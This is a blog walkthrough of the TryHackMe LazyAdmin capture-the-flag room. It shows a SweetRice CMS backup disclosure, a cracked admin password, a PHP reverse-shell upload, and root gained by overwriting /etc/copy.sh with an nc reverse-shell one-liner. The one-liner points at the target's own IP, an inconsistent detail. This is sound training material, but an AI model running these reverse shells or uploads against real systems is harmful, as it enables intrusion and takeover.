---
title: "LazyAdmin TryHackMe Walkthrough"
layout: single
classes: wide
author_profile: true
read_time: true
comments: no
share: true
related: true
description: "A complete walkthrough of the LazyAdmin room on TryHackMe, demonstrating enumeration, exploitation, and privilege escalation."
categories: 
  - Blog
tags: 
  - TryHackMe
  - CTF
  - Privilege Escalation
  - Web Exploits
  - Reverse Shell
  - Enumeration
  - Cybersecurity
  - Linux Privilege Escalation
toc: true
toc_sticky: true
header:
  teaser: /assets/images/thm/ctf/lazyadmin-01.png
  overlay_image: /assets/images/00-hero.jpg
  overlay_filter: 0.3
  caption: "Pwned the LazyAdmin machine on TryHackMe"
---

## Overview

This walkthrough demonstrates how I exploited the **LazyAdmin** room on [TryHackMe](https://tryhackme.com/room/lazyadmin). Each section includes detailed explanations of the enumeration, exploitation, and privilege escalation processes.

---

🎯 **Privilege Escalation Summary:**
- **Vector:** Misconfigured `sudo` permissions on a Perl script (`backup.pl`)
- **Exploitation Technique:** Abuse of a vulnerable shell script (`/etc/copy.sh`) to execute a reverse shell
- **Result:** Full root access via a reverse shell connection

---

## 🕵️ Initial Enumeration

I began by performing a full port scan to identify open services:

```bash
nmap -p- -T4 -A 10.10.95.27
```

<img src="/assets/images/thm/ctf/lazyadmin-02.png">

The results revealed two open ports:
- **Port 22:** SSH  
- **Port 80:** HTTP (Apache)

Navigating to `http://10.10.95.27` on port 80 returned the default Apache2 Ubuntu page:

<img src="/assets/images/thm/ctf/lazyadmin-03.png" alt="Default Apache2 Ubuntu Page" style="max-width:100%; height:auto;">

---

## 🌐 Web Enumeration

### Checking `robots.txt`
I checked the `robots.txt` file at `http://10.10.95.27/robots.txt`, which returned “Not Found.” However, I was able to gather the Apache version `Apache/2.4.18`, which could be useful for identifying potential exploits.

<img src="/assets/images/thm/ctf/lazyadmin-04.png" alt="robots.txt Not Found" style="max-width:100%; height:auto;">

### Directory Busting with FFuF
I then performed directory enumeration using **FFuF**:

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u 'http://10.10.95.27/FUZZ'
```

This revealed an interesting directory named `/content`.

<img src="/assets/images/thm/ctf/lazyadmin-05.png" alt="FFuF Results Revealing Content Directory" style="max-width:100%; height:auto;">

To validate my results, I ran another directory search using **dirsearch**:

<img src="/assets/images/thm/ctf/lazyadmin-06.png" alt="Dirsearch Results" style="max-width:100%; height:auto;">

---

## 📚 Vulnerability Research

After identifying the CMS as **SweetRice 1.5.1**, I searched for public exploits. I discovered two interesting vulnerabilities:

### 1. Backup Disclosure (Exploit-DB 40718)

<a href="https://www.exploit-db.com/exploits/40718" target="_blank">https://www.exploit-db.com/exploits/40718</a>

This exploit allows attackers to access sensitive MySQL backups stored in an unprotected directory.

**Proof of Concept (PoC):**
```text
You can access all MySQL backups and download them from this directory:
http://localhost/inc/mysql_backup

You can also access website file backups from:
http://localhost/SweetRice-transfer.zip
```

<img src="/assets/images/thm/ctf/lazyadmin-11.png" alt="Exploit-DB Backup Disclosure PoC" style="max-width:100%; height:auto;">

### 2. Arbitrary File Upload (Exploit-DB 40716)

<a href="https://www.exploit-db.com/exploits/40716" target="_blank">https://www.exploit-db.com/exploits/40716</a>


This exploit highlights a file upload vulnerability that allows attackers to upload malicious files and gain code execution.

```python
# Exploit Title: SweetRice 1.5.1 - Unrestricted File Upload
# Exploit Author: Ashiyane Digital Security Team
# Date: 03-11-2016

import requests
from requests import session

# Exploit attempts to upload a file via /as directory
login = r.post('http://' + host + '/as/?type=signin', data=payload)

# Targeted upload endpoint and accepted formats (.php5 included)
uploadfile = r.post('http://' + host + '/as/?type=media_center&mode=upload', files=file)
```

The code showed that we needed to target the `/as` directory for the portal login and that `.php5` was an accepted file format for uploading malicious payloads.

---

## 📂 SweetRice Backup Disclosure Exploit

Following the Backup Disclosure PoC, I navigated to the following directory:

```http
http://10.10.95.27/content/inc/mysql_backup/
```

This exposed a MySQL backup file which I downloaded and examined.

<img src="/assets/images/thm/ctf/lazyadmin-12.png" alt="Accessing MySQL Backup Directory" style="max-width:100%; height:auto;">

---

## 🔎 Extracting Credentials

I analyzed the backup file and discovered a hashed password.

```text
Description\";s:5:\"admin\";s:7:\"manager\";s:6:\"passwd\";s:32:\"42f749ade7f9e195bf475f37a44cafcb
```

I used **CrackStation** to crack the hash and obtained the password:

```text
Password: Password123
```

<img src="/assets/images/thm/ctf/lazyadmin-14.png" alt="Cracking Password Hash with CrackStation" style="max-width:100%; height:auto;">

---

## 🔐 CMS Login & Shell Upload

With valid credentials (`manager:Password123`), I logged into the CMS via:

```http
http://10.10.95.27/content/as/
```

<img src="/assets/images/thm/ctf/lazyadmin-16.png" alt="SweetRice CMS Login Page" style="max-width:100%; height:auto;">

---

## 🎯 Uploading a Reverse Shell

After logging in, I navigated to the **Media Center** where I had the ability to upload files.

<img src="/assets/images/thm/ctf/lazyadmin-19.png" alt="Media Center Upload Page" style="max-width:100%; height:auto;">

I prepared a **PHP reverse shell** from **PentestMonkey** and modified it with my Kali IP and port:

<a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank">https://github.com/pentestmonkey/php-reverse-shell</a>

```bash
nano shell.php5
```

<img src="/assets/images/thm/ctf/lazyadmin-20.png" alt="Modifying PHP Reverse Shell Payload" style="max-width:100%; height:auto;">

Started a listener on port 7777:

```bash
nc -lvnp 7777
```

<img src="/assets/images/thm/ctf/lazyadmin-21.png" alt="Netcat Listener Waiting on Port 7777" style="max-width:100%; height:auto;">

Uploaded and triggered the payload:

<img src="/assets/images/thm/ctf/lazyadmin-22.png" alt="Uploading Reverse Shell to Media Center" style="max-width:100%; height:auto;">
<img src="/assets/images/thm/ctf/lazyadmin-23.png" alt="Triggering Reverse Shell Payload" style="max-width:100%; height:auto;">

---

## 🐚 Gaining Foothold

I received a shell as `www-data` and began local enumeration:

```bash
whoami
id
sudo -l
```

<img src="/assets/images/thm/ctf/lazyadmin-24.png" alt="Initial Enumeration as www-data" style="max-width:100%; height:auto;">

---

## 🏗️ Privilege Escalation via Misconfigured `sudo` Permissions

### Reviewing Backup Script (`backup.pl`)
I discovered that I had `sudo` permissions to run `backup.pl` as `root`.

```bash
cat /home/itguy/backup.pl
```

<img src="/assets/images/thm/ctf/lazyadmin-25.png" alt="Contents of backup.pl Script" style="max-width:100%; height:auto;">

The script referenced `/etc/copy.sh`, which contained a reverse shell.

```bash
cat /etc/copy.sh
```

<img src="/assets/images/thm/ctf/lazyadmin-27.png" alt="Contents of copy.sh" style="max-width:100%; height:auto;">

---

## 🚀 Overwriting `copy.sh` to Gain Root

I overwrote `copy.sh` with a reverse shell payload:

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.95.27 5554 > /tmp/f" > /etc/copy.sh
```

<img src="/assets/images/thm/ctf/lazyadmin-28.png" alt="Overwriting copy.sh with Reverse Shell" style="max-width:100%; height:auto;">

---

## 📡 Catching the Root Shell

Set up a new listener on port 5554:

```bash
nc -lvnp 5554
```

<img src="/assets/images/thm/ctf/lazyadmin-29.png" alt="Listener for Root Shell" style="max-width:100%; height:auto;">

Triggered the reverse shell as `root`:

<img src="/assets/images/thm/ctf/lazyadmin-30.png" alt="Root Shell Obtained" style="max-width:100%; height:auto;">

---

## 🎉 Conclusion

LazyAdmin was an exciting machine that demonstrated various critical exploitation techniques:
- Discovered a MySQL backup disclosure vulnerability
- Cracked admin credentials to gain access to the CMS
- Uploaded and triggered a PHP reverse shell
- Gained `root` through misconfigured `sudo` permissions on a backup script

Happy hacking! 🧠💻🔥

[Try the LazyAdmin room on TryHackMe](https://tryhackme.com/room/lazyadmin)
